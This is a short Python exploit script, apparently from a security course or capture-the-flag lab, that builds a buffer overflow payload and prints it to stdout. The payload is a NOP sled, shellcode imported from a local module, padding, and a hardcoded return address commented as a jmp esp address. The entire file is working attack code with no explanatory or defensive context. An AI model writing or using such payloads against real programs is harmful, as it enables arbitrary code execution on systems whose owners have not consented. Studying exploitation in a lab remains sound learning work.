from shellcode import shellcode
from struct import pack 
import sys

bs_bytes = b'\x90'*988 #112 chars until return address
#bs_bytes = bytes(bs_str, 'utf-8')
more_bs_bytes = b'f'*25 # bytes till param want to overwrite
# more_bs_bytes = bytes(more_bs_str, 'utf-8') 

return_address = pack("<I", 0xfffe98d0) #address of jmp esp instruction
# jmp_esp = pack("<I", 0xffe4) * 350 #write past 255 offset to make sure the memory address above contains my payload


# payload = vuln_bytes + return_address
payload = bs_bytes + shellcode + more_bs_bytes + return_address 
sys.stdout.buffer.write(payload) 
# sys.stdout.buffer.write(shellcode) 